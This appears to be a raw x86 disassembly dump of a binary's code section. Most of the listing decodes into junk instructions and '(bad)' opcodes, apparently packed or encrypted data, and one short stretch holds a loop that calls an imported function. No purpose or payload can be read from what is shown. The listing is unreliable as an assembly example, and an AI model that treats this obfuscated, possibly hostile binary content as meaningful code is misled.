  4061ce:	jns    0x40624e
  4061d0:	jle    0x406241
  4061d2:	scas   al,BYTE PTR es:[edi]
  4061d3:	add    al,ch
  4061d5:	fsub   DWORD PTR [esi]
  4061d7:	arpl   WORD PTR [edx+0x49],di
  4061da:	jmp    0x406200
  4061dc:	icebp  
  4061dd:	ret    0x27e1
  4061e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061e1:	aaa    
  4061e2:	xchg   DWORD PTR [esi],esp
  4061e4:	lods   eax,DWORD PTR ds:[esi]
  4061e5:	pop    ebp
  4061e6:	fs mov edx,0x2aafa3e6
  4061ec:	dec    edi
  4061ed:	into   
  4061ee:	test   BYTE PTR [edi],0xd3
  4061f1:	add    DWORD PTR [edx+0x72],ebx
  4061f4:	push   ss
  4061f5:	xchg   esp,eax
  4061f6:	dec    esp
  4061f7:	push   0xffffffa1
  4061f9:	push   es
  4061fa:	jbe    0x406213
  4061fc:	mov    eax,ds:0xf0dc000
  406201:	pop    ecx
  406202:	cmp    bl,BYTE PTR [edi-0x51]
  406205:	cmp    eax,0x1cbd1bc7
  40620a:	lds    ebx,FWORD PTR [ebx]
  40620c:	nop
  40620d:	jno    0x406260
  40620f:	test   eax,0xec24ed10
  406214:	add    al,BYTE PTR [esi+eiz*8+0xc71b4c1]
  40621b:	push   ebp
  40621c:	mov    edx,0xff258d4e
  406221:	dec    ebx
  406222:	mov    WORD PTR [ebx-0x2c],fs
  406225:	das    
  406226:	stos   BYTE PTR es:[edi],al
  406227:	cdq    
  406228:	pop    edx
  406229:	leave  
  40622a:	mov    al,ds:0x9078ed47
  40622f:	lahf   
  406230:	adc    eax,0x6ab8eb63
  406235:	xchg   ebp,eax
  406236:	and    eax,0x710031ea
  40623b:	sahf   
  40623c:	ja     0x40625c
  40623e:	ja     0x4062af
  406240:	loopne 0x406271
  406242:	jmp    0xaaf4:0xa32246f2
  406249:	mov    esi,0x81097a0b
  40624e:	stc    
  40624f:	fsub   st(3),st
  406251:	popf   
  406252:	jnp    0x40625f
  406254:	repnz inc ebx
  406256:	pop    ebp
  406257:	push   ecx
  406258:	jbe    0x406282
  40625a:	cmp    BYTE PTR [ebx+eax*4-0x2523f8a0],bh
  406261:	xor    al,0xa2
  406263:	and    dh,BYTE PTR [edx-0xcb4bdec]
  406269:	push   cs
  40626a:	push   edx
  40626b:	int    0xb8
  40626d:	push   edi
  40626e:	xchg   DWORD PTR [edi+0xc],esi
  406271:	pop    es
  406272:	(bad)  
  406273:	hlt    
  406274:	dec    esi
  406275:	inc    ebx
  406276:	jecxz  0x4062f5
  406278:	cs out 0x6,eax
  40627b:	rol    DWORD PTR [ecx],1
  40627d:	or     eax,0x5c5e1ea3
  406282:	pop    ss
  406283:	sub    al,0xd6
  406285:	push   ds
  406286:	daa    
  406287:	fsubr  QWORD PTR [eax-0x4a]
  40628a:	cdq    
  40628b:	xchg   edi,eax
  40628d:	out    0xd4,eax
  40628f:	clc    
  406290:	in     al,0x1e
  406292:	cmp    eax,0xee39b075
  406297:	lds    edi,FWORD PTR [edx+0x38]
  40629a:	std    
  40629b:	fidiv  DWORD PTR [edi]
  40629d:	aas    
  40629e:	mov    eax,0x629b29f1
  4062a3:	imul   ebp,edi,0xffffff8b
  4062a6:	mov    eax,0xa500d764
  4062ab:	leave  
  4062ac:	aad    0xec
  4062ae:	push   ebx
  4062af:	add    eax,0x7f43095
  4062b4:	jecxz  0x4062ef
  4062b6:	pop    ds
  4062b7:	lods   eax,DWORD PTR ds:[esi]
  4062b8:	jg     0x406265
  4062ba:	daa    
  4062bb:	or     BYTE PTR [ebx+esi*2-0x6750714b],0x6b
  4062c3:	hlt    
  4062c4:	js     0x4062ae
  4062c6:	pop    edi
  4062c7:	push   ss
  4062c8:	adc    DWORD PTR [edx],edi
  4062ca:	out    dx,eax
  4062cb:	std    
  4062cc:	mov    edx,0xebd4583e
  4062d1:	test   DWORD PTR [eax],0xcee1365c
  4062d7:	sbb    eax,DWORD PTR [esi-0x4b3948f5]
  4062dd:	adc    eax,0x44060ea3
  4062e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062e3:	and    al,0xae
  4062e5:	and    DWORD PTR [eax-0x1e],esi
  4062e8:	sbb    al,0x67
  4062ea:	inc    ebx
  4062eb:	out    0xdd,eax
  4062ed:	cs icebp 
  4062ef:	jle    0x40632b
  4062f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062f2:	fisttp WORD PTR [ecx-0x71]
  4062f5:	cdq    
  4062f6:	dec    ebp
  4062f7:	jbe    0x40636b
  4062f9:	inc    esi
  4062fa:	cdq    
  4062fb:	adc    al,0x9a
  4062fd:	sub    DWORD PTR [ecx],ebp
  4062ff:	and    eax,0xcb1ab999
  406304:	push   ebp
  406305:	call   0xd24689a6
  40630a:	dec    eax
  40630b:	lds    edx,FWORD PTR [ebx-0x1372b896]
  406311:	mov    dh,0x33
  406313:	cmp    DWORD PTR [ebp-0x29],0x801506d0
  40631a:	and    eax,0x6ca21570
  40631f:	into   
  406320:	sub    eax,0x35682e87
  406325:	cmp    eax,0xd4dfb34e
  40632a:	cmp    al,BYTE PTR [eax+eiz*2+0x5d848b6c]
  406331:	sbb    BYTE PTR [ecx+esi*1],ah
  406334:	(bad)  
  406335:	fmulp  st(4),st
  406337:	xor    edi,DWORD PTR [eax]
  406339:	test   DWORD PTR [ecx-0x5a00de14],0x52baeb4c
  406343:	rcl    esp,1
  406345:	repz inc ebp
  406347:	and    BYTE PTR [ebp-0x6b],0x69
  40634b:	imul   esi,esp,0x1
  40634e:	bound  ebx,QWORD PTR [edi+0x68eadc9b]
  406354:	call   0x7153:0x3f19a461
  40635b:	sbb    al,0x8b
  40635d:	and    eax,DWORD PTR [esp+esi*2+0xe]
  406361:	ror    BYTE PTR [eax-0x28],0x5c
  406365:	nop
  406366:	pop    es
  406367:	test   DWORD PTR [esi-0x33],esp
  40636a:	jmp    DWORD PTR [ebx-0x183a9ed1]
  406370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406371:	enter  0x9493,0xdb
  406375:	jecxz  0x406347
  406377:	jmp    0x59800706
  40637c:	into   
  40637d:	xchg   ebx,eax
  40637e:	aas    
  40637f:	test   al,0xea
  406381:	add    BYTE PTR [edi-0x7956cebf],ch
  406387:	into   
  406388:	outs   dx,BYTE PTR ds:[esi]
  406389:	sbb    ecx,DWORD PTR [esi-0x71]
  40638c:	out    dx,eax
  40638d:	gs mov dh,0xfa
  406390:	adc    BYTE PTR [edi-0x2555b151],0x34
  406397:	push   cs
  406398:	cs loopne 0x40636a
  40639b:	jecxz  0x4063c0
  40639d:	inc    esi
  40639e:	jg     0x40633f
  4063a0:	nop
  4063a1:	inc    ebp
  4063a3:	sahf   
  4063a4:	int3   
  4063a5:	push   eax
  4063a6:	jo     0x4063fa
  4063a8:	lea    ebx,[ebx]
  4063aa:	push   eax
  4063ab:	cmp    al,0x5a
  4063ad:	xchg   esp,eax
  4063ae:	repz jmp 0xed2d2a78
  4063b4:	test   BYTE PTR [edi-0x67],bl
  4063b7:	pop    ds
  4063b8:	(bad)  
  4063b9:	or     al,0x52
  4063bb:	inc    esp
  4063bc:	jno    0x4063e9
  4063be:	sti    
  4063bf:	jecxz  0x406351
  4063c1:	ror    ebx,1
  4063c3:	inc    edx
  4063c4:	sahf   
  4063c5:	call   0xaf13a114
  4063ca:	test   ecx,edx
  4063cc:	push   0xdbfb6b0c
  4063d1:	pop    eax
  4063d2:	dec    esp
  4063d3:	xchg   bh,cl
  4063d5:	not    al
  4063d7:	pop    esi
  4063d8:	(bad)  
  4063d9:	xchg   edi,eax
  4063da:	mov    ah,0x85
  4063dc:	in     al,0xe2
  4063de:	lds    edx,FWORD PTR [eax+0x29]
  4063e1:	fmul   QWORD PTR [edx-0x3b]
  4063e4:	dec    ecx
  4063e5:	add    ebx,eax
  4063e7:	jns    0x4063b7
  4063e9:	jecxz  0x40637a
  4063eb:	stos   DWORD PTR es:[edi],eax
  4063ec:	leave  
  4063ed:	(bad)  
  4063ef:	sbb    DWORD PTR ds:0x8a9a9f88,esp
  4063f5:	outs   dx,BYTE PTR ds:[esi]
  4063f6:	fidiv  WORD PTR [edx]
  4063f8:	int    0x33
  4063fa:	jmp    0xf39d:0x3bd2ea3
  406401:	mov    cl,0x4e
  406403:	cmc    
  406404:	mov    ds:0x7e6834e9,al
  406409:	push   ecx
  40640a:	ins    BYTE PTR es:[edi],dx
  40640b:	dec    ecx
  40640c:	push   eax
  40640d:	fwait
  40640e:	sub    DWORD PTR [eax-0x2a4948bf],0x66
  406415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406416:	and    DWORD PTR [eax],edx
  406418:	fsubr  DWORD PTR [eax]
  40641a:	dec    edi
  40641b:	idiv   BYTE PTR [esi+ebp*8]
  40641e:	push   ebx
  40641f:	jge    0x406400
  406421:	inc    ebp
  406422:	sub    DWORD PTR [esi],ebp
  406424:	outs   dx,BYTE PTR ds:[esi]
  406425:	fld    QWORD PTR [ebx]
  406427:	sbb    eax,DWORD PTR [ebx+0x20a55fbb]
  40642d:	pop    ss
  40642e:	dec    esp
  40642f:	inc    ebp
  406430:	loop   0x406457
  406432:	add    BYTE PTR [ecx],0x9b
  406435:	add    eax,0xd5a0ee20
  40643a:	ret    0x5eed
  40643d:	dec    ecx
  40643e:	pop    eax
  40643f:	push   cs
  406440:	mov    ecx,0x15ae0e0e
  406445:	icebp  
  406446:	idiv   BYTE PTR [esi]
  406448:	and    dl,BYTE PTR [edi+0x67]
  40644b:	add    eax,0xb9b28330
  406450:	mov    dl,0xda
  406452:	xchg   ebx,eax
  406453:	pop    esi
  406454:	push   ebx
  406455:	xchg   BYTE PTR [edi-0x6df3abe4],cl
  40645b:	rcr    DWORD PTR [ecx+0x268851df],1
  406461:	cmp    eax,0xd9e6114d
  406466:	push   edi
  406467:	sub    DWORD PTR [eax],esi
  406469:	push   ss
  40646a:	mov    ds:0xcf6c605,al
  40646f:	dec    edi
  406470:	mov    ebp,0xb39738cf
  406475:	popa   
  406476:	inc    edx
  406477:	mov    fs,WORD PTR [eax]
  406479:	(bad)  [ebx+0x353bbaf6]
  40647f:	pushf  
  406480:	sar    BYTE PTR [edi-0xf],1
  406483:	mov    eax,0xeb614ab8
  406488:	push   0xffffffd7
  40648a:	sub    eax,0xe2275b7a
  40648f:	data16 sub al,BYTE PTR [edx]
  406492:	or     al,0x2d
  406494:	lods   eax,DWORD PTR ds:[esi]
  406495:	rcr    DWORD PTR [edx],0x62
  406498:	inc    edi
  406499:	mov    WORD PTR [ebp+0x31],gs
  40649c:	jbe    0x4064fe
  40649e:	jne    0x40645f
  4064a0:	push   edi
  4064a1:	add    al,0xb8
  4064a3:	bound  esi,QWORD PTR [eax]
  4064a5:	(bad)  
  4064a7:	adc    DWORD PTR [ebp+0x11d9831f],ecx
  4064ad:	(bad)  
  4064ae:	aam    0xfe
  4064b0:	retf   
  4064b1:	mov    ebp,0xcbec3e17
  4064b6:	inc    ebx
  4064b7:	neg    BYTE PTR [eax]
  4064b9:	les    edi,FWORD PTR [ebx-0x37]
  4064bc:	or     dl,BYTE PTR [edx+eiz*2-0x17eea725]
  4064c3:	test   BYTE PTR [edx-0x1da1f0c0],ch
  4064c9:	in     al,dx
  4064ca:	jbe    0x40653a
  4064cc:	test   BYTE PTR [esi-0x6b],bl
  4064cf:	push   eax
  4064d0:	inc    ecx
  4064d1:	jo     0x40652f
  4064d3:	inc    ebx
  4064d4:	dec    edx
  4064d5:	mov    ebx,0x79801cb8
  4064da:	stc    
  4064db:	sub    al,dl
  4064dd:	ret    
  4064de:	cmc    
  4064df:	stos   BYTE PTR es:[edi],al
  4064e0:	mov    dh,0x21
  4064e2:	sbb    DWORD PTR [ecx],ebx
  4064e4:	lahf   
  4064e5:	fld    TBYTE PTR [edx-0x47]
  4064e8:	in     eax,0x4a
  4064ea:	into   
  4064eb:	sub    cl,0x5e
  4064ee:	in     eax,0x9a
  4064f0:	mov    edi,0x2a06502c
  4064f5:	shl    BYTE PTR [eax+eax*4-0x23bf7196],1
  4064fc:	jmp    0x3211a250
  406501:	xor    ax,0xb1d1
  406505:	fwait
  406506:	popa   
  406507:	mov    cl,0x86
  406509:	mov    cl,0xee
  40650b:	push   0x47
  40650d:	mov    esp,0x2a8a25ea
  406512:	mov    bl,0xbd
  406514:	mov    bl,0xdd
  406516:	xchg   ebp,edi
  406518:	call   0xd70c687f
  40651d:	adc    BYTE PTR [edi+eax*2],0x5d
  406521:	xor    ebp,DWORD PTR [esi+ebx*2+0x16def02a]
  406528:	xchg   ebp,eax
  406529:	mov    dh,0x43
  40652b:	and    al,0x8d
  40652d:	addr16 pushf 
  40652f:	out    dx,eax
  406530:	sbb    DWORD PTR [edi],0xffffff96
  406533:	aas    
  406534:	mov    WORD PTR [edi],?
  406536:	in     al,dx
  406537:	mov    al,dh
  406539:	lods   al,BYTE PTR ds:[esi]
  40653a:	inc    ecx
  40653b:	mov    BYTE PTR [ecx+0x2b],bl
  40653e:	pop    ss
  40653f:	rol    BYTE PTR [eax+0x1b],cl
  406542:	pushf  
  406543:	lea    esp,[ecx+0x6404001b]
  406549:	int    0x94
  40654b:	(bad)  
  40654c:	sbb    DWORD PTR [edi+0x4bc0c92],ebx
  406552:	int3   
  406553:	pusha  
  406554:	pop    ebp
  406555:	inc    ebx
  406556:	mov    dl,0x60
  406558:	cmp    bl,BYTE PTR [ebp+0x60dc80a1]
  40655e:	mov    edx,0xaad3caaa
  406563:	push   cs
  406564:	pop    ss
  406565:	push   0x2a33dee4
  40656a:	push   0x18c4737f
  40656f:	or     ch,BYTE PTR [edi+0xa]
  406572:	arpl   WORD PTR [ebx+0x5e0db51c],cx
  406578:	je     0x406589
  40657a:	shr    BYTE PTR [edi+0x30],0xe3
  40657e:	int3   
  40657f:	dec    esp
  406580:	push   ebp
  406581:	fstp   DWORD PTR [eax-0x5893435f]
  406587:	cmp    BYTE PTR [esi+0x9],0x2e
  40658b:	cmc    
  40658c:	pop    ebp
  40658d:	icebp  
  40658e:	add    DWORD PTR [ecx+0x759d68e1],edi
  406594:	ins    BYTE PTR es:[edi],dx
  406595:	(bad)  
  406596:	or     BYTE PTR [ebp-0x433e9fe1],dh
  40659c:	fwait
  40659d:	sbb    ch,BYTE PTR [esi]
  40659f:	jmp    0xfdc:0x458dbd6f
  4065a6:	mov    bh,0xd
  4065a8:	mov    ebx,0x23004346
  4065ad:	or     eax,0x4345f3
  4065b2:	mov    DWORD PTR ds:0x4346bb,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x4345ff,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43470f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x4345f7,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x43464f,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x4345eb,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x4345eb
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x4345eb,ecx
  4065fa:	cmp    DWORD PTR ds:0x4345eb,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x434647
  40660f:	push   0x43491f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x4345eb,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	and    BYTE PTR [esi+0x2],0x6f
  40663c:	dec    esp
  40663d:	cmp    edi,DWORD PTR [esi+0x7e]
  406640:	dec    edi
  406641:	jns    0x4066c1
  406643:	jle    0x4066a9
  406645:	ds and al,0x6f
  406648:	pop    esi
  406649:	xor    esp,esp
  40664b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40664c:	loope  0x406649
  40664e:	sbb    al,0xa
  406650:	pop    eax
  406651:	mov    dh,0xc6
  406653:	jne    0x4065f2
  406655:	jmp    0xfe8ed0eb
  40665a:	es mov ebx,0xb94dad4a
  406660:	xor    eax,0x720554e6
  406665:	out    0x52,eax
  406667:	or     ebp,DWORD PTR [edi+0x1c]
  40666a:	gs mov esi,0xa868b948
  406670:	fwait
  406671:	mov    bh,0x42
  406673:	scas   al,BYTE PTR es:[edi]
  406674:	push   ss
  406675:	rcr    BYTE PTR [ecx+0x1e1e2b30],1
  40667b:	fdivr  st,st(4)
  40667d:	nop
  40667e:	icebp  
  40667f:	sbb    eax,0xc3824c81
  406684:	dec    ebx
  406685:	cmovge eax,esi
  406688:	sub    bh,BYTE PTR [ebp+edx*2-0x59]
  40668c:	push   ecx
  40668d:	data16 cmp BYTE PTR [edi-0x7502a1f9],cl
  406694:	shl    ebx,1
  406696:	pop    edi
  406697:	adc    bl,cl
  406699:	push   ds
  40669a:	mov    ah,0x47
  40669c:	mov    ds:0x754c9498,eax
  4066a1:	sbb    ebp,ebx
  4066a3:	imul   edi,ecx,0xffffffe3
  4066a6:	and    al,cl
  4066a8:	leave  
  4066a9:	add    cl,dh
  4066ab:	add    edx,0xef3e90bc
  4066b1:	shr    DWORD PTR [ebx-0x1fa3f41b],cl
  4066b7:	push   ds
  4066b8:	inc    esp
  4066b9:	(bad)  
  4066ba:	or     eax,DWORD PTR [ebx+0x6e32c583]
  4066c0:	pop    ebp
  4066c1:	(bad)  
  4066c2:	imul   ebx,DWORD PTR [esi],0xffffff9b
  4066c5:	test   DWORD PTR [edi+0x526bd418],edx
  4066cb:	pop    es
  4066cc:	push   ds
  4066cd:	aad    0x54
  4066cf:	ret    
  4066d0:	or     eax,0x23fb5e74
  4066d5:	jmp    0xe176:0xfb3c480f
  4066dc:	add    cl,BYTE PTR [edi]
  4066de:	aam    0x94
  4066e0:	outs   dx,DWORD PTR ds:[esi]
  4066e1:	fsub   QWORD PTR [ebp-0x5b]
  4066e4:	loopne 0x40673f
  4066e6:	inc    ebp
  4066e7:	cmp    BYTE PTR [ebp-0x7a70c9d6],0x3b
  4066ee:	or     BYTE PTR [edi-0x641dd352],ch
  4066f4:	jl     0x4066fc
  4066f6:	jl     0x40668c
  4066f8:	shl    DWORD PTR [edi],1
  4066fa:	dec    esi
  4066fb:	push   edi
  4066fc:	in     eax,dx
  4066fd:	ret    0x79b6
  406700:	mov    esp,eax
  406702:	add    al,0x40
  406704:	push   0xd5fea3da
  406709:	sub    cl,ah
  40670b:	sbb    BYTE PTR [edx-0x3],al
  40670e:	xor    ecx,DWORD PTR [esi+edx*8+0x16]
  406712:	lods   al,BYTE PTR ds:[esi]
  406713:	mov    edx,0x5a171fc9
  406718:	test   DWORD PTR [ecx+0x3d4d8bbf],ebp
  40671e:	xchg   ebx,eax
  40671f:	dec    esp
  406720:	xchg   ebp,eax
  406721:	pushf  
  406722:	imul   esi,DWORD PTR [ebp-0x64],0xa39c1720
  406729:	stc    
  40672a:	mov    bl,0x16
  40672c:	repz leave 
  40672e:	sbb    ebp,esi
  406730:	or     ebx,0xffffffa6
  406733:	push   0x4dacdc4d
  406738:	sub    ecx,edx
  40673a:	dec    ebx
  40673b:	push   ecx
  40673c:	out    dx,al
  40673d:	es jecxz 0x406788
  406740:	loope  0x40673d
  406742:	into   
  406743:	inc    esi
  406744:	in     eax,0xf7
  406746:	xchg   ebx,eax
  406747:	pop    eax
  406748:	sbb    DWORD PTR [ecx],0x2d273bdf
  40674e:	ret    0x34f1
  406751:	in     eax,dx
  406752:	pop    ebx
  406753:	mov    al,ds:0x9c0e1083
  406758:	std    
  406759:	push   ebp
  40675a:	rcl    BYTE PTR [edx+edi*8],cl
  40675d:	scas   al,BYTE PTR es:[edi]
  40675e:	jmp    0x76d7:0xa34a7c69
  406765:	pop    edx
  406766:	push   esp
  406767:	mov    ah,0x90
  406769:	push   edx
  40676a:	cmp    ch,BYTE PTR [edi-0x60]
  40676d:	imul   eax,DWORD PTR [ebx+0x43],0x1857a4ea
  406774:	and    al,BYTE PTR [ebx-0x294e7d3f]
  40677a:	cld    
  40677b:	push   ds
  40677c:	adc    ecx,DWORD PTR [ecx]
  40677e:	enter  0xb666,0x98
  406782:	sub    ebx,edi
  406784:	inc    edx
  406785:	out    0x2f,eax
  406787:	test   BYTE PTR [edi],cl
  406789:	and    BYTE PTR [esp+ebx*8-0x7b],ah
  40678d:	je     0x40676b
  40678f:	lds    edi,FWORD PTR [ebx-0x14b6c420]
  406795:	jmp    0xfbbcbf59
  40679a:	hlt    
  40679b:	in     eax,0xca
  40679d:	and    al,0xf2
  40679f:	add    DWORD PTR [ecx],0xa38eb889
  4067a5:	lods   al,BYTE PTR ds:[esi]
  4067a6:	xchg   ecx,eax
  4067a7:	mov    eax,ds:0xf89d2d12
  4067ac:	into   
  4067ad:	je     0x4067d5
  4067af:	cmp    dh,0x2a
  4067b2:	cs mov ah,0x80
  4067b5:	xor    ah,al
  4067b7:	xchg   ebx,eax
  4067b8:	sub    DWORD PTR [ebx-0x6aeac50b],ecx
  4067be:	xor    ebx,eax
  4067c0:	repnz adc edx,DWORD PTR [edi+0x53ebf5b8]
  4067c7:	mov    edi,0xdd90f2ee
  4067cc:	sti    
  4067cd:	test   DWORD PTR ds:0x9c8bc1ee,0x7ed07186
  4067d7:	push   esi
  4067d8:	pop    ebp
  4067d9:	xchg   esp,eax
  4067da:	popf   
  4067db:	push   edi
  4067dc:	into   
  4067dd:	pop    es
  4067de:	retf   0xbee4
  4067e1:	sub    ecx,eax
  4067e3:	out    dx,al
  4067e4:	jg     0x40680b
  4067e6:	stc    
  4067e7:	inc    esi
  4067e8:	scas   eax,DWORD PTR es:[edi]
  4067e9:	ja     0x4067aa
  4067eb:	retf   0x1ae1
  4067ee:	scas   al,BYTE PTR es:[edi]
  4067ef:	xor    al,0x7a
  4067f1:	js     0x40684f
  4067f3:	pop    es
  4067f4:	inc    eax
  4067f5:	push   cs
  4067f6:	mov    esi,0xeb823092
  4067fb:	dec    ecx
  4067fc:	pusha  
  4067fd:	mov    al,ds:0xa5895869
  406802:	mov    gs,ebx
  406804:	jnp    0x4067fd
  406806:	scas   al,BYTE PTR es:[edi]
  406807:	(bad)  
  406808:	push   ss
  406809:	fcomp  QWORD PTR [edi]
  40680b:	fmul   st,st(2)
  40680d:	mov    eax,ds:0x72e860e2
  406812:	(bad)  [eax+ebp*2-0x52]
  406816:	lods   al,BYTE PTR ds:[esi]
  406817:	daa    
  406818:	pop    ebp
  406819:	dec    ebx
  40681a:	pushf  
  40681b:	inc    ebx
  40681c:	push   ecx
  40681d:	push   0x5e
  40681f:	icebp  
  406820:	dec    esp
  406821:	nop
  406822:	sub    eax,esi
  406824:	xchg   esi,eax
  406825:	xor    DWORD PTR [eax+ebx*1],esi
  406828:	mov    esp,0xe41441bb
  40682d:	fbld   TBYTE PTR [ecx+ecx*2-0x4fe2695f]
  406834:	stos   BYTE PTR es:[edi],al
  406835:	jle    0x4067fc
  406837:	mov    al,ds:0xf30dc7a6
  40683c:	jo     0x40680d
  40683e:	and    BYTE PTR [edx+0x5f],al
  406841:	xchg   ecx,eax
  406842:	in     eax,dx
  406843:	aam    0xb2
  406845:	dec    edi
  406846:	jae    0x4068ac
  406848:	fcomp  QWORD PTR [ebx+0x3d]
  40684b:	inc    edx
  40684c:	test   BYTE PTR [edx-0x24],ah
  40684f:	adc    BYTE PTR [ebx-0x11547e98],cl
  406855:	in     al,0xba
  406857:	dec    ebx
  406858:	sub    DWORD PTR [edi],0x1ee4521a
  40685e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40685f:	hlt    
  406860:	(bad)  
  406862:	(bad)  
  406863:	adc    ch,BYTE PTR [eax+ebp*1-0x6d]
  406867:	sub    al,0x85
  406869:	outs   dx,DWORD PTR ds:[esi]
  40686a:	in     eax,0x25
  40686c:	mov    eax,0x9dfa6047
  406871:	fsub   st,st(1)
  406873:	ss push ecx
  406875:	icebp  
  406876:	push   edx
  406877:	cmp    bh,ch
  406879:	pop    esp
  40687a:	stos   BYTE PTR es:[edi],al
  40687b:	pop    ecx
  40687c:	fnstcw WORD PTR [eax]
  40687e:	adc    al,0x46
  406880:	sbb    esi,DWORD PTR [edx+0x1d]
  406883:	in     al,0xb9
  406885:	popf   
  406886:	push   cs
  406887:	aad    0x93
  406889:	icebp  
  40688a:	mov    ebp,0xbc5280fe
  40688f:	mov    edi,0xa0a8e4db
  406894:	gs (bad) 
  406896:	mov    ecx,0xe04b200d
  40689b:	cmp    DWORD PTR [eax],ebx
  40689d:	fs ins DWORD PTR es:[edi],dx
  40689f:	out    dx,eax
  4068a0:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068a2:	mov    ds:0xa477bbba,eax
  4068a7:	test   eax,0x34ce1cff
  4068ac:	fsub   QWORD PTR [esi+0x1f]
  4068af:	add    BYTE PTR [eax+0x4c],0x2b
  4068b3:	pop    ds
  4068b4:	test   eax,0xba4224c7
  4068b9:	nop
  4068ba:	in     eax,0x4c
  4068bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068bd:	mov    BYTE PTR [esi-0x35],ah
  4068c0:	inc    ebp
  4068c1:	stc    
  4068c2:	ds sti 
  4068c4:	jo     0x406889
  4068c6:	xchg   DWORD PTR [esi+0x457f7d5a],ebp
  4068cc:	(bad)  
  4068cd:	(bad)  
  4068ce:	out    0x81,eax
  4068d0:	scas   al,BYTE PTR es:[edi]
  4068d1:	or     eax,0x8d8c58fd
  4068d6:	ins    DWORD PTR es:[edi],dx
  4068d7:	mov    edx,0x38657657
  4068dc:	and    ebp,esi
  4068de:	mov    bl,0x97
  4068e0:	popa   
  4068e1:	cdq    
  4068e2:	jg     0x4068a5
  4068e4:	es mov al,0xb3
  4068e7:	call   0x837b2f31
  4068ec:	jmp    0x4068ff
  4068ee:	fwait
  4068ef:	cli    
  4068f0:	dec    esi
  4068f1:	mov    ebp,0xa2942013
  4068f6:	fnstsw WORD PTR [edx-0xe]
  4068f9:	aaa    
  4068fa:	ss dec ebp
  4068fc:	add    al,0xf3
  4068fe:	push   esi
  4068ff:	(bad)  
  406900:	sbb    bl,BYTE PTR [ebp+0x76]
  406903:	out    dx,al
  406904:	(bad)  
  406905:	and    al,0xf1
  406907:	(bad)  [ebp-0x59]
  40690a:	mov    ah,0x80
  40690c:	ins    DWORD PTR es:[edi],dx
  40690d:	cdq    
  40690e:	in     al,dx
  40690f:	(bad)  
  406910:	(bad)  
  406912:	ss cmp eax,0x9df6d3b4
  406918:	jae    0x4068fa
  40691a:	test   al,0x0
  40691c:	and    DWORD PTR [ecx],ebx
  40691e:	jp     0x4068b7
  406920:	shr    ch,1
  406922:	out    dx,al
  406923:	xchg   ebp,eax
  406924:	inc    edx
  406925:	fcomp  DWORD PTR [edx-0x61e9a618]
  40692b:	pop    ecx
  40692c:	sbb    ah,ah
  40692e:	xor    DWORD PTR [esi-0x43],ebp
  406931:	or     DWORD PTR [eax+0x7ad85483],ebx
  406937:	pop    ds
  406938:	data16 adc BYTE PTR [ebx],bl
  40693b:	retf   
  40693c:	rol    DWORD PTR [ebx+ebp*4],0xd4
  406940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406941:	jmp    0x40699a
  406943:	leave  
  406944:	jns    0x406997
  406946:	lahf   
  406947:	iret   
  406948:	ins    BYTE PTR es:[edi],dx
  406949:	shl    DWORD PTR [edx+edi*2],0x3a
  40694d:	mov    bh,0x53
  40694f:	aad    0x62
  406951:	xchg   ecx,eax
  406952:	int3   
  406953:	xchg   ecx,eax
  406954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406955:	lods   al,BYTE PTR ds:[esi]
  406956:	ins    DWORD PTR es:[edi],dx
  406957:	inc    esp
  406958:	scas   eax,DWORD PTR es:[edi]
  406959:	adc    al,0xd1
  40695b:	mov    eax,ds:0x80d2e1b1
  406960:	fsubr  QWORD PTR [esp+ecx*2-0x4]
  406964:	adc    eax,0xa4e95950
  406969:	push   ecx
  40696a:	scas   al,BYTE PTR es:[edi]
  40696b:	xor    dl,BYTE PTR [eax+0x2ecc06a5]
  406971:	jnp    0x406941
  406973:	ret    
  406974:	sbb    bl,al
  406976:	js     0x4069ec
  406978:	cmp    DWORD PTR [esi],ecx
  40697a:	sub    edi,DWORD PTR [ebx-0x6e]
  40697d:	mov    ds:0x46e61ef8,al
  406982:	inc    esi
  406983:	pop    es
  406984:	jnp    0x4069e5
  406986:	xchg   DWORD PTR [edx+0x46d0e983],esi
  40698c:	test   esi,ecx
  40698e:	cs test al,0x1b
  406991:	ror    BYTE PTR ds:0xfa806910,1
  406997:	push   ebx
  406998:	test   DWORD PTR [edi+0x6c],ebp
  40699b:	ss ret 0xc751
  40699f:	xchg   esi,eax
  4069a0:	rol    DWORD PTR [ebp+ecx*8+0x2a],1
  4069a4:	shr    bl,1
  4069a6:	push   eax
  4069a7:	jecxz  0x4069eb
  4069a9:	test   cl,cl
  4069ab:	cld    
  4069ac:	fcmovnbe st,st(0)
  4069ae:	sar    edi,1
  4069b0:	aas    
  4069b1:	dec    ebx
  4069b2:	mov    dh,0x23
  4069b4:	(bad)  
  4069b5:	mov    esp,0xb3702889
  4069ba:	mov    ds:0x2924549a,al
  4069bf:	out    0x10,eax
  4069c1:	icebp  
